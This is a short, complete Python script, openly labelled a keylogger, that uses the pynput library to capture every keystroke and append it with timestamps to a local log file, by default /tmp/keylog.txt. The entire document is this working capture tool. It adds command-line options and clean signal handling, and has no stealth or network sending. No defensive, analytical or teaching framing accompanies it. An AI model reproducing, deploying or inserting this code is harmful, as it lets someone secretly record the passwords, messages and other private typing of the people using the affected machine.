#!/usr/bin/env python3
"""Simple keylogger. Captures keystrokes to a log file with timestamps."""

import argparse
import os
import signal
import sys
from datetime import datetime
from pathlib import Path

from pynput import keyboard


SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
}


class KeyLogger:
    def __init__(self, log_path: Path, include_timestamps: bool = True):
        self.log_path = log_path
        self.include_timestamps = include_timestamps
        self.log_file = None
        self.listener = None

    def _open_log(self) -> None:
        self.log_path.parent.mkdir(parents=True, exist_ok=True)
        self.log_file = open(self.log_path, "a", buffering=1, encoding="utf-8")
        if self.include_timestamps:
            self.log_file.write(
                f"\n--- Session started {datetime.now().isoformat()} ---\n"
            )

    def _format_key(self, key) -> str:
        if key in SPECIAL_KEYS:
            return SPECIAL_KEYS[key]
        if hasattr(key, "char") and key.char is not None:
            return key.char
        return f"[{str(key).replace('Key.', '')}]"

    def on_press(self, key) -> None:
        try:
            text = self._format_key(key)
            if self.include_timestamps and text in ("\n", "\t"):
                self.log_file.write(text)
            elif self.include_timestamps:
                prefix = datetime.now().strftime("[%H:%M:%S] ")
                self.log_file.write(f"{prefix}{text}" if text.startswith("[") else text)
            else:
                self.log_file.write(text)
        except Exception as err:
            sys.stderr.write(f"keylogger write failed: {err}\n")

    def start(self) -> None:
        self._open_log()
        signal.signal(signal.SIGTERM, lambda *_: self.stop())
        signal.signal(signal.SIGINT, lambda *_: self.stop())
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

    def stop(self) -> None:
        if self.listener is not None:
            self.listener.stop()
        if self.log_file is not None:
            self.log_file.write(
                f"\n--- Session ended {datetime.now().isoformat()} ---\n"
            )
            self.log_file.close()
        sys.exit(0)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Simple keystroke logger")
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=Path(os.environ.get("KEYLOG_PATH", "/tmp/keylog.txt")),
        help="Path to log file (default: /tmp/keylog.txt or $KEYLOG_PATH)",
    )
    parser.add_argument(
        "--no-timestamps",
        action="store_true",
        help="Omit session timestamps from the log",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    logger = KeyLogger(args.output, include_timestamps=not args.no_timestamps)
    logger.start()


if __name__ == "__main__":
    main()
